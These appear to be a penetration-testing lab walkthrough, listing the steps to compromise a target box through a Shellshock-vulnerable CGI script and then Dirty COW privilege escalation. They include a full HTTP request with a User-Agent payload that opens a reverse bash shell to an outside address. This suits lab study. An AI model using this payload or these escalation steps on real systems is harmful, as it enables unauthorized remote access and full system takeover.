1. nmap scan shows port 22 and 80 open.
2. Gobuster on port 80 with multiple wordlist shows /cgi-bin/
3. Gobuster on /cgi-bin/ shows /test url.
4. Further gobuster did not reveal any other url endpoint hence went with nikto scan.
5. Nikto scan result shows the website url "/cgi-bin/test" is vulnerable to shellshock vulnerability.
6. Searching google for shellshock vulnerability found that we need inject the code for remote #shellshock connection on the user-agent field.
		*GET /cgi-bin/test HTTP/1.1*
		*Host: 192.168.212.87*
		*User-Agent: () { :;}; /bin/bash -c 'bash -i >& /dev/tcp/192.168.45.197/8888 0>&1'*
		*Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8*
		*Accept-Language: en-US,en;q=0.5*
		*Accept-Encoding: gzip, deflate, br*
		*Connection: close*
		*Upgrade-Insecure-Requests: 1exit*
7. This gives us the foot hold on the box.
8. Running linpeas.sh shows that the linux version is outdated. #vuln_kernel 
9. Quick google search point to us to dirtycow exploit.
10. Uploading and executing the dirtycow exploit gives us the root access. #dirtycow